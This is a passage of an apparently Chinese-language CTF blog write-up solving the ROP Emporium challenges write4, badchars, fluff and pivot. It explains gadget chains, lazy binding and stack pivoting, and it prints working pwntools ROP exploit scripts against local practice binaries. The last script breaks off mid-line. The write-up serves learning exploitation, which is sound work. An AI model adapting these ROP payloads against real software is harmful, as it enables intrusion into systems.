+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">低地址<br>+---------------------------------------+                            <br>|<span class="hljs-string">         pop r14;pop r15;ret;指令地址    </span>|<span class="hljs-string">     </span><br><span class="hljs-string">+---------------------------------------+                                       </span><br><span class="hljs-string"></span>|<span class="hljs-string">            .bss/.data段中的地址         </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">+---------------------------------------+                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">            &quot;flag.txt&quot;字符串            </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">+---------------------------------------+                                        </span><br><span class="hljs-string"></span>|<span class="hljs-string">  mov qword ptr [r14], r15; ret指令地址 </span>|<span class="hljs-string">                                       </span><br><span class="hljs-string">+---------------------------------------+ </span><br><span class="hljs-string">高地址 </span><br></code></pre></td></tr></table></figure>
+
+<p>之后就是从内存中读取”flag.txt“字符串并调用<code>print_file</code>函数，需要用到<code>pop rdi;ret</code>这样的<code>gadget</code>，对应读操作部分的ROP链如下：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">低地址<br>+---------------------------------------+                            <br>|<span class="hljs-string">           pop rdi;ret;指令地址         </span>|<span class="hljs-string">     </span><br><span class="hljs-string">+---------------------------------------+                                       </span><br><span class="hljs-string"></span>|<span class="hljs-string">          .bss/.data段中相同的地址       </span>|<span class="hljs-string">                                            </span><br><span class="hljs-string">+---------------------------------------+                                        </span><br><span class="hljs-string"></span>|<span class="hljs-string">            print_file函数地址          </span>|<span class="hljs-string">                                       </span><br><span class="hljs-string">+---------------------------------------+ </span><br><span class="hljs-string">高地址 </span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>一开始还在想怎么获取<code>print_file</code>函数地址（毕竟只知道在<code>libwrite4.so</code>中的偏移量）呢，结果发现<code>write4</code>程序中的<code>usefulFunction</code>函数调用了<code> print_file</code>函数，这样一来我们就可以通过<code>plt</code>表调用该函数了。</p>
+</blockquote>
+<p>最终脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./write4&quot;</span>)<br><br>ret_addr = <span class="hljs-number">0x400616</span><br><br>gadget_ppr_addr = <span class="hljs-number">0x400690</span><br>data_addr = <span class="hljs-number">0x601030</span><br>insert_data = <span class="hljs-string">&quot;flag.txt&quot;</span>.encode()<br>gadget_mr_addr = <span class="hljs-number">0x400628</span><br><br>gadget_pr_addr = <span class="hljs-number">0x400693</span><br>print_file_func_addr = <span class="hljs-number">0x400510</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + p64(ret_addr)<br>payload += p64(gadget_ppr_addr) + p64(data_addr) + insert_data + p64(gadget_mr_addr)<br>payload += p64(gadget_pr_addr) + p64(data_addr)<br>payload += p64(print_file_func_addr)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151101833.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>同write4题目一样，只不过多了一个输入检查。我们只需要在原来的基础上，通过<code>xor|ret</code>或<code>add|ret</code>或<code>sub|ret</code>这样的<code>gadget</code>修复即可。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151147975.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以在write4题目中的写、读ROP链之间，添加多个如下ROP链以修复<code>flag.txt</code>字符串：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">低地址<br>+---------------------------------------+                            <br>|<span class="hljs-string">         pop r14;pop r15;ret;指令地址    </span>|<span class="hljs-string">     </span><br><span class="hljs-string">+---------------------------------------+                                       </span><br><span class="hljs-string"></span>|<span class="hljs-string">            字符ASCII码  + 21           </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">+---------------------------------------+                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">    待修复的字符所在.bss/.data段中的地址    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">+---------------------------------------+                                        </span><br><span class="hljs-string"></span>|<span class="hljs-string">     add [r15], r14b;ret;指令地址       </span>|<span class="hljs-string">                                       </span><br><span class="hljs-string">+---------------------------------------+ </span><br><span class="hljs-string">高地址 </span><br></code></pre></td></tr></table></figure>
+
+<p>不过需要注意的是之前使用的<code>mov qword ptr [r14], r15; ret</code>这样的<code>gadget</code>没有了，需要使用<code>mov qword ptr [r13], r12;ret</code>这样的<code>gadget</code>，同时搭配<code>pop r12;pop r13;pop r14;pop r15;ret;</code>的<code>gadget</code>使用，这样就需要额外的16bytes填充字符。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151434337.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./badchars&quot;</span>)<br><span class="hljs-comment">#sh = gdb.debug(&quot;./badchars&quot;, &quot;break pwnme&quot;)</span><br>ret_addr = <span class="hljs-number">0x400616</span><br><br>pop_r12_13_r14_r15_ret = <span class="hljs-number">0x40069c</span><br>data_addr = <span class="hljs-number">0x601030</span><br>insert_data = <span class="hljs-string">&quot;flag.txt&quot;</span>.encode()<br>mov_r13_r12_ret = <span class="hljs-number">0x400634</span> <span class="hljs-comment">#r13 store memory addr</span><br><br>pop_rdi_ret = <span class="hljs-number">0x4006a3</span><br>print_file_func_addr = <span class="hljs-number">0x400510</span><br><br>pop_r14_r15_ret = <span class="hljs-number">0x4006a0</span><br>add_r15_r14b_ret = <span class="hljs-number">0x40062c</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + p64(ret_addr)<br>payload += p64(pop_r12_13_r14_r15_ret) + insert_data + p64(data_addr) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">16</span><br>payload += p64(mov_r13_r12_ret)<br><br>payload += p64(pop_r14_r15_ret) + p64(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>) + <span class="hljs-number">21</span>) + p64(data_addr + <span class="hljs-number">2</span>) + p64(add_r15_r14b_ret)<br>payload += p64(pop_r14_r15_ret) + p64(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;g&quot;</span>) + <span class="hljs-number">21</span>) + p64(data_addr + <span class="hljs-number">3</span>) + p64(add_r15_r14b_ret)<br>payload += p64(pop_r14_r15_ret) + p64(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">21</span>) + p64(data_addr + <span class="hljs-number">4</span>) + p64(add_r15_r14b_ret)<br>payload += p64(pop_r14_r15_ret) + p64(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;x&quot;</span>) + <span class="hljs-number">21</span>) + p64(data_addr + <span class="hljs-number">6</span>) + p64(add_r15_r14b_ret)<br><br>payload += p64(pop_rdi_ret) + p64(data_addr)<br>payload += p64(print_file_func_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;payload = <span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>sh.sendline(payload)<br><br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151225830.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>同write4一样，需要我们将<code>flag.txt</code>写入内存，不过这次使用的是另一种<code>gadget</code>组合。直接看给出的<code>questionableGadgets</code>：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400628</span> questionableGadgets:<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400628</span>                 <span class="hljs-keyword">xlat</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400629</span>                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040062A <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>000000000040062A                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span>000000000040062B                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>000000000040062C                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-number">3EF2h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400633</span>                 <span class="hljs-keyword">bextr</span>   <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400638</span>                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400639</span> <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400639</span>                 <span class="hljs-keyword">stosb</span><br><span class="hljs-symbol">.text:</span>000000000040063A                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure>
+
+<p>查阅了<code>xlat</code>、<code>bextr</code>、<code>stosb</code>指令的作用。</p>
+<ul>
+<li><code>xlat</code>指令：使用 <code>AL</code> 寄存器中的值作为索引，从内存地址 <code>DS:RBX + AL</code> 处检索一个字节，将这个字节的值加载到 <code>AL</code> 寄存器中。</li>
+<li><code>bextr</code>指令：指令格式为<code>bextr dest, src, control</code>。其中<code>dest</code>是目标寄存器，用于存储提取的位域结果。<code>src</code>是源寄存器，从中提取位域。<code>control</code>是控制寄存器，指定了要提取的位域的起始位置（由低8bits(0~7)决定）和长度（由高8bits(8~15)决定）。</li>
+<li><code>stosb</code>指令：将 <code>AL</code> 寄存器中的字节值存储到 <code>RDI</code> 寄存器指向的内存位置，<code>RDI</code>寄存器自增或自减（<code>DF</code>标志位决定）。</li>
+</ul>
+<p>初步思路就是使用<code>xlat</code>指令从内存中取<code>flag.txt</code>中的各个字符，再通过<code>stosb</code>指令存储到<code>rdi</code>寄存器指定的位置。取字符的话需要修正<code>rbx</code>寄存器，可以通过<code>questionableGadgets</code>中的第<code>5~9</code>行修正，但是地址还受到<code>al</code>寄存器的影响，可是并不存在这样的<code>pop gadget</code>来修改<code>al</code>寄存器。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151615318.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此对于最开始的<code>al</code>寄存器的值，我们只能动调程序运行完<code>pwnme</code>函数后查看。而对于后续的<code>al</code>寄存器的值，是通过<code>xlat</code>指令改变的，这一改变我们是可以明确知道的（即<code>al</code>中的值会变成当前我们所要寻找的字符的值）。</p>
+<p>整个ROP链构造如下：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">低地址<br>+------------------------------------------------+                            <br>|<span class="hljs-string">                32 + 8bytes字符填充              </span>|<span class="hljs-string">     </span><br><span class="hljs-string">+------------------------------------------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                  ret指令修正栈对齐               </span>|<span class="hljs-string"> </span><br><span class="hljs-string">+------------------------------------------------+                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">                pop rdi;ret;指令地址             </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">+------------------------------------------------+                                        </span><br><span class="hljs-string"></span>|<span class="hljs-string">                   存放字符串的地址               </span>|<span class="hljs-string">                                       </span><br><span class="hljs-string">+------------------------------------------------+  ------  </span><br><span class="hljs-string"></span>|<span class="hljs-string">   pop rdx;pop rcx;add...;bextr...;ret指令地址   </span>|<span class="hljs-string">        </span>|<br>+------------------------------------------------+        |<span class="hljs-string">                     </span><br><span class="hljs-string"></span>|<span class="hljs-string">           0x4000 (图个方便，直接变成mov rbx, rcx) </span>|<span class="hljs-string">        </span>|<br>+------------------------------------------------+        |<span class="hljs-string"></span><br><span class="hljs-string"></span>|<span class="hljs-string">     字符所在地址 - al -0x3EF2  (这个值pop到rcx)    </span>|<span class="hljs-string">        </span>|<span class="hljs-string">-------&gt; 第一轮，移动&#x27;f&#x27;字符</span><br><span class="hljs-string">+------------------------------------------------+        </span>|<span class="hljs-string">                                 </span><br><span class="hljs-string"></span>|<span class="hljs-string">                 xlat;ret;指令地址               </span>|<span class="hljs-string">        </span>|<span class="hljs-string">                                 </span><br><span class="hljs-string">+------------------------------------------------+        </span>|<span class="hljs-string">                               </span><br><span class="hljs-string"></span>|<span class="hljs-string">                 stosb;ret指令地址               </span>|<span class="hljs-string">        </span>|<span class="hljs-string">                               </span><br><span class="hljs-string">+------------------------------------------------+  ------  </span><br><span class="hljs-string"></span>|<span class="hljs-string">               剩余7轮构造flag.txt                </span>|<br>|<span class="hljs-string">                    ......                      </span>|<br>|<span class="hljs-string">                                                </span>|<br>+------------------------------------------------+  ----                                     <br>|<span class="hljs-string">                pop rdi;ret;指令地址             </span>|<span class="hljs-string">      </span>|<span class="hljs-string">                                   </span><br><span class="hljs-string">+------------------------------------------------+      </span>|<span class="hljs-string">-----&gt;xlat指令修改了rdi，需要进行修正</span><br><span class="hljs-string"></span>|<span class="hljs-string">                   存放字符串的地址                </span>|<span class="hljs-string">     </span>|<br>+------------------------------------------------+  ---- <br>|<span class="hljs-string">                   print_file函数地址            </span>|<span class="hljs-string"> </span><br><span class="hljs-string">+------------------------------------------------+ </span><br><span class="hljs-string">高地址 </span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>对应脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./fluff&quot;</span>)<br><span class="hljs-comment">#sh = gdb.debug(&quot;./fluff&quot;, &quot;break pwnme&quot;)</span><br>ret_addr = <span class="hljs-number">0x400627</span><br>pop_rdi_ret = <span class="hljs-number">0x4006a3</span><br>string_addr = <span class="hljs-number">0x601030</span><br>pop2_add_bextr_ret = <span class="hljs-number">0x40062A</span><br>xlat_ret = <span class="hljs-number">0x400628</span><br>stosb_ret = <span class="hljs-number">0x400639</span><br>store_rdx_val = <span class="hljs-number">0x4000</span><br><span class="hljs-comment">#动调查看具体值</span><br>al_val = <span class="hljs-number">0xb</span><br><br>file_name = <span class="hljs-string">&quot;flag.txt&quot;</span><br><span class="hljs-comment"># &quot;flag.txt&quot;中各个字符的地址</span><br>alp_addr_list = [<span class="hljs-number">0x4003c4</span>, <span class="hljs-number">0x400239</span>, <span class="hljs-number">0x4003d6</span>, <span class="hljs-number">0x4003cf</span>, <span class="hljs-number">0x4003c9</span>, <span class="hljs-number">0x4003d5</span>, <span class="hljs-number">0x400246</span>, <span class="hljs-number">0x4003d5</span>]<br><br>print_file_addr = <span class="hljs-number">0x400510</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + p64(ret_addr)<br>payload += p64(pop_rdi_ret) + p64(string_addr)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(alp_addr_list)):<br>    payload += p64(pop2_add_bextr_ret) + p64(store_rdx_val) + p64(alp_addr_list[i] - al_val - <span class="hljs-number">0x3EF2</span>)<br>    payload += p64(xlat_ret) + p64(stosb_ret)<br>    al_val = <span class="hljs-built_in">ord</span>(file_name[i])<br><br>payload += p64(pop_rdi_ret) + p64(string_addr)<br>payload += p64(print_file_addr)<br><br>sh.sendline(payload)<br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406151727464.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152257370.png" srcset="/img/loading.gif" lazyload></p>
+<p>要求我们输入<code>a1</code>和<code>s</code>，<code>s</code>的输入存在栈溢出，但是也只有24bytes可用于ROP链的构造，显然是不太够的。但是题目会输出<code>a1</code>的值，指向的是在<code>main</code>函数中动态开辟的空间，再加上如下<code>gadget</code>，可以构造栈迁移的ROP链，使栈指针<code>rsp</code>指向堆栈中的动态空间。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152300254.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中<code>xchg</code>指令用于交换两个寄存器的值。</p>
+<p>栈迁移的<code>ROP</code>链的示意图如下：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">低地址<br><span class="hljs-code">+------------------------------------------------+</span>                            <br><span class="hljs-section">|                32 + 8bytes字符填充              |    40bytes </span><br><span class="hljs-section">+------------------------------------------------+</span><br>|               pop rax;ret;指令地址               |   8bytes<br><span class="hljs-code">+------------------------------------------------+</span>                                         <br>|                    接收到的a1                   |    8bytes                                   <br><span class="hljs-code">+------------------------------------------------+</span>                                        <br>|            xchg rax, rsp;ret;指令地址           |    8bytes                                   <br><span class="hljs-code">+------------------------------------------------+</span>                           <br>高地址 <br></code></pre></td></tr></table></figure>
+
+
+
+<p>接下来通过分析以及提示，我们可以知道需要构造ROP链调用<code>ret2win</code>函数，但是在<code>pivot</code>程序中并没有导入<code>ret2win</code>函数，但是导入了<code>foothold_function</code>函数，这两个函数都在<code>libpivot.so</code>动态库中。因此我猜测可能要通过<code>foothold_function</code>函数作为踏板来调用<code>ret2win</code>函数，如果我们知道<code>foothold_function</code>函数和<code>ret2win</code>函数在<code>libpivot.so</code>动态库的偏移量，也就知道了它们之间的差值，又由于<code>pivot</code>程序中导入了<code>foothold_function</code>函数，因此我们可以知道<code>foothold_function</code>函数的地址，这样一来就可以求出<code>ret2win</code>函数地址。但是，我们需要注意的是，程序中的外部导入函数的调用涉及到<strong>懒绑定</strong>。</p>
+<h3 id="懒绑定"><a href="#懒绑定" class="headerlink" title="懒绑定"></a>懒绑定</h3><p><strong>懒绑定</strong>，即函数直到第一次被调用时才进行地址绑定。这个过程涉及到<code>.plt</code>表和<code>.got.plt</code>表（简称<code>.got</code>表）：</p>
+<ul>
+<li><p><strong>.plt（Procedure Linkage Table）</strong></p>
+<p><code>.plt</code> 表包含一系列的跳转指令，用于调用外部函数。每个函数在 <code>.plt</code> 中都有一个对应的入口，该入口最初指向 <code>.plt</code> 中的一段代码，用于解析函数地址。</p>
+</li>
+<li><p><strong>got.plt（Global Offset Table for PLT）</strong></p>
+<p><code>.got.plt</code> 表包含指针，这些指针最初指向 <code>.plt</code> 表中的某些指令。当函数地址被解析后，这些指针会被更新为函数的实际地址。</p>
+</li>
+</ul>
+<p><strong>懒绑定</strong>具体原理如下：</p>
+<ol>
+<li><p><strong>初始调用</strong>:</p>
+<p>当程序第一次调用一个外部函数（如 <code>puts</code>）时，调用会进入 <code>.plt</code> 表中对应的入口。</p>
+<ul>
+<li><p>该入口执行一个跳转指令，跳转到 <code>.got.plt</code> 表中对应位置存储的地址。</p>
+</li>
+<li><p>初始状态下，<code>.got.plt</code> 表中的地址指向 <code>.plt</code> 表中一段特殊的代码，这段代码会调用<strong>动态链接器</strong>（dynamic linker）来解析函数的实际地址。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>动态链接器解析</strong>:</p>
+<ul>
+<li>动态链接器（如 <code>_dl_runtime_resolve</code>）会查找函数的实际地址。</li>
+<li>查找到函数的实际地址后，动态链接器会将该地址写入 <code>.got.plt</code> 表中的相应位置。</li>
+</ul>
+</li>
+<li><p><strong>后续调用</strong>:</p>
+<ul>
+<li>在函数地址解析之后，<code>.got.plt</code> 表中的地址已被更新为函数的实际地址。</li>
+<li>后续对该函数的调用会直接跳转到函数的实际地址，而不再需要经过动态链接器。</li>
+</ul>
+</li>
+</ol>
+<p>理解了懒绑定之后，回到题目上来，为了能够确切的获取<code>.got.plt</code>表中<code>foothold_function</code>函数地址，我们就需要手动调用一次该函数。通过寻找，发现可用以下<code>gadget</code>来构造出我们想要的<code>ROP</code>链。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152350307.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过以上<code>gadget</code>，构造如下<code>ROP</code>链调用<code>ret2win</code>函数：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">低地址<br>+------------------------------------------------+                            <br>|<span class="hljs-string">                foothold_function@plt           </span>|<span class="hljs-string">    </span><br><span class="hljs-string">+------------------------------------------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">               pop rax;ret;指令地址               </span>|<span class="hljs-string">   </span><br><span class="hljs-string">+------------------------------------------------+                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">                foothold_function@got           </span>|<span class="hljs-string">                                      </span><br><span class="hljs-string">+------------------------------------------------+                                        </span><br><span class="hljs-string"></span>|<span class="hljs-string">      mov rax, qword ptr [rax];ret;指令地址      </span>|<span class="hljs-string">                                   </span><br><span class="hljs-string">+------------------------------------------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                pop rbp;ret;指令地址             </span>|<span class="hljs-string">    </span><br><span class="hljs-string">+------------------------------------------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">       ret2win - foothold_function的差值         </span>|<span class="hljs-string">   </span><br><span class="hljs-string">+------------------------------------------------+                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">            add rax, rbp; ret;指令地址           </span>|<span class="hljs-string">                                      </span><br><span class="hljs-string">+------------------------------------------------+                                        </span><br><span class="hljs-string"></span>|<span class="hljs-string">                call rax;指令地址                </span>|<span class="hljs-string">                                   </span><br><span class="hljs-string">+------------------------------------------------+                           </span><br><span class="hljs-string">高地址 </span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>最终脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./pivot&quot;</span>)<br><span class="hljs-comment">#sh = gdb.debug(&quot;./pivot&quot;, &quot;break *0x40095d&quot;)</span><br>elf_pivot = ELF(<span class="hljs-string">&quot;./pivot&quot;</span>)<br>elf_libpivot = ELF(<span class="hljs-string">&quot;./libpivot.so&quot;</span>)<br><br>ret_addr = <span class="hljs-number">0x4006b6</span><br>pop_rax_ret = <span class="hljs-number">0x4009bb</span><br>xchg_ret = <span class="hljs-number">0x4009bd</span><br>foothold_function_plt = elf_pivot.plt[<span class="hljs-string">&quot;foothold_function&quot;</span>]<br>foothold_function_got = elf_pivot.got[<span class="hljs-string">&quot;foothold_function&quot;</span>]<br>offset = elf_libpivot.sym[<span class="hljs-string">&quot;ret2win&quot;</span>] - elf_libpivot.sym[<span class="hljs-string">&quot;foothold_function&quot;</span>]<br><br>mov_rax2_ret = <span class="hljs-number">0x4009c0</span><br>pop_rbp_ret = <span class="hljs-number">0x4007c8</span><br>add_rax_rbp_ret = <span class="hljs-number">0x4009c4</span><br>call_rax = <span class="hljs-number">0x4006b0</span><br><br>sh.recvuntil(<span class="hljs-string">b&#x27;The Old Gods kindly bestow upon you a place to pivot: &#x27;</span>)<br>a1_pointer = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>), <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># 构造栈迁移的ROP链</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>) + 